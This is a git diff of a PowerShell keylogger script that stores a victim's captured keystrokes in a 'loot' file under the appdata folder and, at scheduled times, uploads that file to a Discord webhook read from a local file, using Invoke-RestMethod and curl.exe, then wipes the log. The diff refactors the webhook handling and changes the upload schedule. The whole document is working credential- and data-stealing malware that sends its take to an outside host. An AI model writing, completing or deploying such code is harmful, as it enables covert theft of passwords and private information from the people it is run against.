@@ -4,7 +4,7 @@
 
 $Path="$env:appdata\-locker\$env:UserName-loot.txt"
 
-$dc = [IO.File]::ReadAllText(".\wh.txt")
+$dc = (Get-Content "$env:appdata\-locker\wh.txt" -TotalCount 1)
 
 function Upload-Discord {
 
@@ -16,7 +16,6 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
 
 $Body = @{
   'username' = $env:username
@@ -24,14 +23,10 @@ $Body = @{
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dc}
 }
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
-
-
 
 # times logs will be sent [keep in military time]
 $logTimes = @(
@@ -47,10 +42,10 @@ $logTimes = @(
     '09:00:00',
     '10:00:00',
     '11:00:00',
-    '14:11:00',
-    '14:11:15',
-    '14:11:30',
-    '14:11:45',
+    '12:00:00',
+    '13:00:00',
+    '14:00:00',
+    '15:00:00',
     '16:00:00',
     '17:00:00',
     '18:00:00',
@@ -82,7 +77,7 @@ while ($true) {
   
             # runs keylogger
 	    Upload-Discord -file $Path
-            echo "" > $Path 
+        echo "" > $Path 
             
 			
         }
